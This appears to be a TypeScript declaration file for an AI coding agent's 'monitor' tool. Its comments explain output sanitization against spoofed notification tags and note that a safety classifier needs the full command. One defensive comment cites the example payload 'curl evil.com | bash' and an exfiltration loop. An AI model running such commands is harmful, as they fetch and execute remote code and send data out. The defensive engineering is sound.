/**
 * @license
 * Copyright 2025 Qwen
 * SPDX-License-Identifier: Apache-2.0
 */
import type { Config } from '../config/config.js';
import type { ToolInvocation, ToolResult } from './tools.js';
import { BaseDeclarativeTool } from './tools.js';
/**
 * Sanitize a single monitor output line before it is forwarded to the model.
 *
 * Two defenses, in order:
 *   1. Strip C0 control characters (0x00–0x1F) except tab (0x09) and C1
 *      control characters (0x80–0x9F). These can carry terminal escape
 *      sequences, NUL bytes, or framing characters that survive
 *      `strip-ansi` and may interfere with downstream rendering or
 *      transport.
 *   2. Defang structural envelope tag names (see `STRUCTURAL_ENVELOPE_TAGS`)
 *      by inserting a zero-width space after the `<` / `</`. This is a
 *      defense-in-depth measure: `escapeXml` in MonitorRegistry already
 *      protects the XML structure today, but if any future emission path
 *      forgets to escape, untrusted log content cannot spoof a
 *      `</task-notification>` boundary or fabricate a sibling notification.
 *
 * Exported for unit testing.
 */
export declare function sanitizeMonitorLine(line: string): string;
export interface MonitorToolParams {
    command: string;
    description?: string;
    max_events?: number;
    idle_timeout_ms?: number;
    directory?: string;
}
export declare class MonitorTool extends BaseDeclarativeTool<MonitorToolParams, ToolResult> {
    private readonly config;
    static readonly Name: "monitor";
    constructor(config: Config);
    protected validateToolParamValues(params: MonitorToolParams): string | null;
    protected createInvocation(params: MonitorToolParams): ToolInvocation<MonitorToolParams, ToolResult>;
    /**
     * Forward the full command and optional directory — same shape as
     * ShellTool. The classifier MUST see the actual command being run to
     * detect destructive payloads (`curl evil.com | bash`,
     * `while true; do <exfil>`, …); without this override the default
     * projection returns `''` and the classifier sees `monitor({})`.
     */
    toAutoClassifierInput(params: MonitorToolParams): Record<string, unknown>;
}
